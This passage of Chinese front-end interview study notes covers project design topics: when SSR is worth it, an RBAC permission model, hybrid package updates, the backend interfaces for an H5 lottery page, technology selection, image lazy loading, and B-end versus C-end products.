前后端同构，开发成本高（学习、调试、运维等）

## 是否需要 SSR

是否能利用 SSR 的优势
- 你的项目是否需要 SEO ？—— 管理后台就不需要
- 你的项目是否在意极致的性能优化，或者会否有可能处于弱网环境（网络好，速度不会太慢的）—— 管理后台就不需要

如果急需要 SSR 的优势和价值，那就去承担 SSR 的成本。如果不需要这些优势，那 SSR 就成了一个累赘。

## SSR 的应用场景

C 端，以阅读为主的单页面，如新闻页，运营宣传广告页面，官网等。1. 需要快；2. 需要 SEO


# 项目设计\07-角色权限模型.md
# 权限管理

## 题目

如何设计一个基础的 用户-角色-权限 模型？<br>
例如，一个博客管理后台，可以添加很多用户，分配不同的角色，不同角色具有不同权限
- 普通用户：查看博客，审核通过博客，下架博客
- 管理员：修改博客，删除博客 + 普通用户的权限
- 超级管理员：添加用户，删除用户，绑定用户和角色 + 管理员的权限

## 分析

很多公司招聘前端工程师来开发、维护后台管理系统，toB 的系统。角色权限管理是最基本的模块。<br>
要想成为项目技术负责人，必须要熟知这部分内容的设计。

## RBAC 模型

RBAC - Role-based access control 基于角色的访问控制。它可以满足我们绝大部分管理系统的管理权限控制。

- 三个模型
    - 用户
    - 角色
    - 权限
- 两个关系（以角色为“轴”）
    - 角色 - 用户
    - 角色 - 权限

![](./img/RBAC1.png)

## 举例

![](./img/RBAC2.png)

## 功能

用户管理
- 增删改查
- 绑定角色

角色管理
- 增删改查
- 绑定权限

权限管理
- 增删改查

## 答案

RBAC 模型
- 数据结构
- 功能

## 扩展

我刚毕业时，开发一个企业项目管理系统，里面会加很多大家临时想出来的功能。后来我考了 PMP ，才发现很多事情都是已经有了既定解决方案的，不需要自己创新。


# 项目设计\08-hybrid更新机制.md
# hybrid 更新机制

## 题目

请设计一个 hybrid 包的更新流程

## hybrid 运作流程

![](./img/hybrid1.png)

小提示：hybrid html 中 ajax 请求的 url 不能省略协议名称（如 `//xxx.com/api/getInfo`），否则会默认以 `file` 协议请求。必须明确协议名称 `http` 或者 `https`。

## 上传新版本的 hybrid 包

hybrid 包是需要实时更新的，就跟 H5 网上上线一样。更新之后，App 要下载、使用最新版本的 hybrid 包。

![](./img/hybrid2.png)

何时触发检查、下载最新版本呢？有两种选择
- App 启动时检查、下载
- 实时检查、下载（如每隔 5min）

## 延迟使用

以上两种时机，都会遇到一个问题：如果检查到最新版本，立刻下载使用，可能会影响的性能。
为了避免这个影响，可以考虑“延迟使用”。
- 检测到新版本，先后台下载，目前先使用旧版本
- 待现在完成，再替换为新版本使用

## 答案

- hybrid 基本概念，和基本流程
- 最新包的延迟使用


# 项目设计\09-H5抽奖页.md
# H5 抽奖页

## 题目

![](./img/抽奖.png)

你作为前端负责人，来开发一个 h5 页，某个抽奖功能的运营活动，如上图。假定 PM 和后端 RD 都是实习生，技术和业务都不熟练。

你要从 0 开发这个页面，你会要求 server 端给你哪些接口和能力？

## 多数人的答案

所有人都能想到，需要一个**抽奖接口**。否则，他就不是一个合格的程序员了。

很少一部分人能想到，需要一个**用户信息接口**，否则都不知道奖品给谁，总得登录一下。或者直接输入手机号抽奖也行，但需求没说这里有手机号。

还有，假如刚刚抽了奖，再重新进入界面，是否要禁用抽奖？是否要限制每个人抽奖一次？—— 这些需求没说，但这些很重要，这些可都需要后端支持。

## 答案

我预期的答案当然是比较全面的，但是很遗憾，我曾经面试过这么多人，没有一个人能答全。

- 获取用户信息（同时判断是否登录）
- 如果登录，判断该用户是否已经抽奖，以判断他是否还能继续抽奖
- 抽奖接口
    - 可能还需要调用登录接口
    - 当然也可以直接输入手机号抽奖，需明确需求
- 埋点统计
    - pv
    - 自定义事件
- 微信分享

由此可见，一个看似简单的功能，其背后并不一定简单。

![](./img/抽奖-流程.png)

## 扩展

这个面试题不是考察知识点和技术能力的，完全就是在考察你对一个业务的理解能力。

由此你就可以看出，程序员对于需求和业务理解能力有多么重要！直接会影响到你的 API 接口设计，进而影响到你的开发。

有些时候，PM 和 RD 比较靠谱，他们能考虑清楚整个流程，你也就顺利的完成了，这很幸运。

但大部分情况下，你都会遇到一些不靠谱的人，或者太忙没空理你的人。这个时候就要靠你去承担起来，而你有没有这种能力呢？

在你抱怨别人不靠谱，抱怨需求频繁改动的时候，你有没有从自己的身上找一找原因。

如果你是老板，你如何看待这件事？你是否希望你的员工都深入了解业务？

能联想到的还有很多很多……


# 项目设计\10-技术选型.md
# 技术选型

## 题目

如何做技术选型？

## 选什么

制定项目技术方案，技术选型是非常重要的一个环节。

- 框架
- JS vs TS

## 误区

> 技术没有好坏之分，要看是否适合自己和团队成员

不要用自己的意识形态来评价技术的好坏，例如
- React 就是比 Vue 好，用 Vue 的都是 JS 小白
- Svelte 是新出的框架，我们要提前拥抱未来
- Vue3 发布了，我们赶紧用，体验新技术
- TS 比 JS 好，大家都说好

以上这些想法都是不对的，不能因此而做技术选型。<br>
我很清晰的记得，去年有一个同事，在没有评审的情况下，私自用 Svelte 搭建了一个项目，结果被领导强烈拒绝。

这就好比很多人说：xxx 车就是好，这儿好，那儿好 —— 结果，看看大街上，没几个人买。

## 技术选型的依据

第一，选择社区已经成熟的，用户已经足够多的 —— 经受了大量用户的验证，出了问题也好找人讨论
- Vue React TS 都具备这个条件，而 Angular 至少在国内没有
- Vue3 Svelte 等新发布的，等等再用

第二，选择你公司已经有技术沉淀的，甚至已经有了很多第三方的可用组件，节省开发成本

第三，要考虑团队成员的学习成本，不要只考虑自己 —— 什么，你想带领大家一起学习？省省吧，用不着你去拯救别人

第四，考虑它的价值，能否抵消它的成本。例如
- 你们做的是一个大型系统，用 TS 确实能减少很多 bug ，那就用 —— 你要考虑 TS 的学习成本，以及维护成本（规避各种 `any`）
- 你们做的是一个小型系统，用 TS 提升也不太大，那就别用

总之，不要为了技术而技术，也不要只考虑自己而是全局考虑。要达到这个境界，你就需要去学习各种框架和技术，而不是只会某一个框架。

## 答案

- 考虑社区成熟度
- 考虑公司的技术积累
- 考虑团队成员的学习成本
- 考虑它的价值是否真的被利用


# 项目设计\11-图片懒加载.md
# 图片懒加载

## 题目

设计一个 H5 页面的图片懒加载功能

## 要点

第一，`<img>` 要使用 `data-src`（或其他属性）记录 src 。还有，loading.gif 要自定义，要配合实际图片的尺寸。

```html
<img src="./img/loading.gif" data-src="./img/animal1.jpeg"/>
```

第二，可以使用 `Element.getBoundingClientRect()` 来判断当前元素的位置

![](./img/rect.png)

第三，页面滚动实时计算，注意**节流**

## 实现

代码参考 img-lazy-load.html


# 项目设计\12-文本小节-B端-C端.md
# B 端 - C 端

注：文字小节

## 题目

B 端和 C 端有和区别

## 名词解释

- B 端，即 toB - to Business 面向商业、生产者
- C 端，即 toC - to Customer 面向消费者、终端用户

## B 端

B 端一般是对内的管理系统。<br>
大厂会自研很多内部管理平台、运营平台，供自己人使用。还有一些公司是专门为企业提供内部管理系统的，如 OA CMS ERP 财务软件等。

管理系统一般用于专业的业务领域，所以功能都非常复杂。这就需要复杂的组件设计，拆分和抽离，要深入熟悉业务才能更好的制作技术方案。
所以，B 端系统一般都是业务驱动的，业务运营人员的话语权更重。

但它的流量不会太大，一般后台一个服务器、一个数据库即可满足。而且用户环境比较单一，网络情况好，不用考虑极致的性能优化、浏览器兼容性等。

## C 端

C 端一般是对外的落地页，就是我们日常消费的各种新闻、小视频页面。<br>
这代表着这个公司对外的核心业务，也是公司最核心的产品，一般都会自研、不会购买或者外包。

C 端系统一般都是民用级别的，不会有什么复杂专业的功能。<br>
但它的流量一般很大，后台可能需要很多服务器集群，需要各种 CDN 和缓存。而且，它的用户群体很不固定，手机、浏览器、网络等都不确定，需要全面的性能优化和统计、监控。<br>
所以，C 端一般是技术驱动的，技术人员话语权很重。

大型互联网公司内部的企业文化，技术人员话语权大，也是因为他们 C 端产品比较多，而且 C 端是核心产品。

## SaaS

SaaS - Software as a service 软件即服务，它集合了 B 端和 C 端。

例如常见的腾讯文档、在线画图软件、在线 PS 等。他们既有 B 端的复杂功能，又有 C 端面向终端用户的特点。SaaS 的研发成本是非常高的。

## 前端工程师更多服务于 B 端

C 端产品，即我们日常使用的产品，其实数量并不多，而且需求变化也不会太快。所以并不需要大量的人来维护。像百度的搜索页面，2-3 个前端团队即可以维护。<br>
但是我还是推荐大家有机会一定要去做一下 C 端产品，体验一下大流量、大用户的情况下，暴露出来的各种问题，以及解决方案。

而 B 端产品，业务非常多，业务天天变，新的需求每天都会产生。也因为复杂度高，bug 就一直断不了。所以，B 端会需要更多的前端人员来开发和维护。

我本人很有幸，既做过 C 端又做过 B 端，所以了解比较多。


# 项目设计\13-总结.md
# 总结

## 内容总结

本章讲解项目设计相关的面试题。面试官给出一个项目需求或者功能，让候选人做技术方案设计，考察综合能力。

## 划重点

- 要能识别需求，转换为技术方案
- 技术方案 = 数据模型 + 功能
- 数据结构设计很重要，决定了设计的下限

## 注意事项

- 看整体设计，不要追求细节

